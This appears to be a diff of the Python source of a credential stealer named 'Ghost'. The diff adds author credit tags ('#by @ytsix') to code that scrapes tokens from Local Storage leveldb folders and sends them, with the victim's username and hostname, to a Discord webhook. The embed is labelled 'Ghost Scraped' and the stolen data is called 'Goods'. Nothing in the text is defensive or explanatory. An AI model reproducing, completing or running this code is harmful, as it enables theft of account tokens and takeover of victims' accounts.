@@ -2,6 +2,8 @@ import requests, os, re, sys, shutil, string, winreg
 
 from dhooks import Webhook, Embed
 
+#by @ytsix
+
 def GhostExt(path):
     path += '\\Local Storage\\leveldb'
     tokens = []
@@ -17,7 +19,7 @@ def GhostExt(path):
         return tokens
     except:
         pass
-
+#by @ytsix
 
 def GhostInf():
     
@@ -71,7 +73,7 @@ def GhostProc():
         message += '```'
 
 
-        embed = Embed(title=f' [ Ghost Scraped -> | {user} | {hostname} ] ',color=16764108)
+        embed = Embed(title=f' [ [#by @ytsix] Ghost Scraped -> | {user} | {hostname} ] ',color=16764108)
         embed.add_field("Goods =>",message)
         hook.send(embed=embed)
         
